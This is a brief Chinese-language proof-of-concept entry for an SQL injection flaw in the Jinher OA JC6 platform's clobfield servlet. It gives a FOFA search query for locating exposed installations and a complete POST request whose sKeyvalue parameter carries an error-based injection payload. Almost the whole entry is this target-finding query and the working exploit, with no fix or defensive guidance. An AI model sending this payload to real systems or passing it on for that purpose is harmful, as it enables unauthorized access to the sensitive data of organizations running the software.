## 金和OA jc6 clobfield SQL注入漏洞
金和OA jc6 ljc6/servlet/clobfield接口处存在SQL注入漏洞，攻击者可获取数据中中敏感信息。

## fofa
```

title="金和协同管理平台" || body="js/PasswordCommon.js" || body="js/PasswordNew.js" || body="Jinher Network" || (body="c6/Jhsoft.Web.login" && body="CloseWindowNoAsk") || header="Path=/jc6" || (body="JC6金和协同管理平台" && body="src=\"/jc6/platform/") || body="window.location = \"JHSoft.MobileApp/Default.htm\";" || banner="Path=/jc6"
```

## poc
```
POST /jc6/servlet/clobfield HTTP/1.1
host:127.0.0.1

key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11%27%2F**%2Fand%2F**%2FCONVERT%28int%2C%40%40version%29%3D1%2F**%2Fand%2F**%2F%27%27%3D%27
```
![image](https://github.com/wy876/POC/assets/139549762/09333181-7373-4930-ad60-91e168709564)


